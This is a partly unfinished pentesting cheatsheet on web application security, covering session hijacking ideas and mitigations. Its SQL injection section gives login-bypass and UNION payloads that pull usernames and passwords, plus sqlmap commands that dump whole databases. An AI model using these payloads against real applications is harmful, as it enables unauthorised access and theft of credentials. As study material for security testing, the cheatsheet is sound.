Web Application Security Cheatsheet - NORMAL
==============================================

## Table of Contents

- [Session Management](#session-management)  
- [Access Controls](#access-controls)  
- [Cross-Site Scripting (XSS)](#cross-site-scripting)  
- [SQL Injection](#sql-injection)  

## Session Management
---

**Summary**  

Anatomy of a session cookie:  
_REQUEST: Server -> Client_
![Server -> Client](Resources/Cookie1.png)  
_REQUEST: Client -> Server_  
![Client -> Server](Resources/Cookie2.png)  

**Exploitation**  

Session Creation:  
* Attack the PRNG (pseudo-number-generator) and generate my own token?
  * Perform a brute force attack if PRNG is weak / patterns can be inferred.
* Hijack a valid user session by stealing their token after they log in.  

Session Handling / Transfer / Usage:  
* Steal the user cookie via. XSS.
  * Mitigated by `HttpOnly` flag: instructs web browsers not to allow scripts to access cookies. via the DOM document.cookie object.
* Steal the user cookie via. redirection to an external page.  

Session Clean-Up:
* Check / change cookie expiration.  

XXS via. cookies:
* Insert XSS payload into cookie content.  

**Mitigation**  

Session Creation:
* New tokens should be issued on login / privilege change.  
* Don't use persistent cookies or cacheable cookies.
* Set `HttpOnly` flag.  

Session Handling / Transfer / Usage:  
* Perform server-side validation of a user's session.  
* Don't reveal session tokens in a URL parameter.  
* Disable web-browser cross-tab sessions.  

Session Clean-up:
* Destroy sessions tokens appropriately: implement token expiration, avoid token re-use.  
* Force session logout on web browser window close events.  

## Access Controls
---

**Summary**  


**Exploitation**  


**Mitigation**  


## Cross-Site Scripting
---

**Summary**

**Exploitation**

**Mitigation**


## SQL Injection
---  

More SQLi cheatsheets: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

**Summary**  

`UNION` operator is used to combine the resulting set of 2 or more SELECT statements.
* e.g. `SELECT name FROM customers UNION SELECT name FROM suppliers`
* ^Combines customer and suppliers names in one table, displaying distinct rows only.
* `UNION ALL` is the same but displays all rows.  

**Exploitation: Manual**  

Authentication Bypass
```SQL
BLIND
' or '1'='1

SELECT
' UNION ALL SELECT CURRENT_USER, '1
' UNION ALL SELECT name,pass FROM users WHERE name="noone"--    # whitespace needed after -- comment

INSERT
" INSERT INTO users (user, pass, uuid) VALUES ('brian', 'brian', '123')
```

**Exploitation: Sqlmap**  

Dump everything + level 4 tests + 10 threads.  
`python sqlmap.py -u https://example.com/?id=1 -a --level=4 --threads=10`  

Dump a specific table within a database  
`python sqlmap.py -u https://example.com/?id=1 --dump -D DATABASE -T TABLENAME`  

Enumerate information inside `information_schema.tables`:
* This is a standard MySQL table which will contain metadata for every table within a database.




**Mitigation**
